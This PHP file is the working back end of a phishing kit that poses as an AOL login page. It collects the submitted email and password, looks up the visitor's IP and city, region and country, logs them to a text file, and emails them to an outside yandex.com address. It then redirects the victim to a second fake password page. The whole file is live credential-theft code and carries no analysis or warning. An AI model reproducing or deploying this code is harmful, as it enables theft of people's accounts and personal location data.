<?php
	
	$email = $_POST['username'];
	$passwd = $_POST['password'];
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }
	if($email != null && $passwd != null){

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "Email: " . $_POST['username'] . "\n"; 
    $message .= "Password: " . $_POST['password'] . "\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$handle = fopen("JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);
	
	$send ="php24990@yandex.com";

	$subject = "Aol $ip";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	}
	}
?>
<script>
	window.location="password2.php?email=<?php echo $email ?>&?done=https%3A%2F%2Fwww.aol.com%2F&acrumb=2gpYKtio&display=login&authMechanism=primary&sessionIndex=Qg--&e=true&pcn=password";
</script>

